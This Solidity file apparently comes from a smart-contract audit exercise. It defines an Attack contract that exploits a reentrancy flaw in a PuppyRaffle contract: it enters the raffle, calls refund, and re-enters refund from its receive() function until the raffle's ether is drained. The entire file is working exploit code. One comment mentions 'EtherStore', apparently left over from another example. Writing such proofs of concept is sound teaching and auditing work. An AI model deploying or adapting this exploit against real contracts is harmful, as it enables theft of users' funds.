// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {PuppyRaffle} from "./PuppyRaffle.sol";

contract Attack {
    PuppyRaffle puppyRaffle;

    uint256 public constant AMOUNT = 1 ether;

    constructor(address _puppyRaffleAddress) {
        puppyRaffle = PuppyRaffle(_puppyRaffleAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    receive() external payable {
        if (address(puppyRaffle).balance >= AMOUNT) {
            uint256 index = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(index);
        }
    }

    function attack() external payable {
        // Create address array for enterRaffle ARG
        address[] memory players = new address[](1);
        players[0] = address(this);

        // Ensure attack only executes when there are entries in puppyRaffle.
        require(address(puppyRaffle).balance >= AMOUNT);

        // EnterRaffle with this contract (required to be able to call refund)
        puppyRaffle.enterRaffle{value: puppyRaffle.entranceFee()}(players);

        // Call refund to trigger receive reentrency loop.
        uint256 index = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(index);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}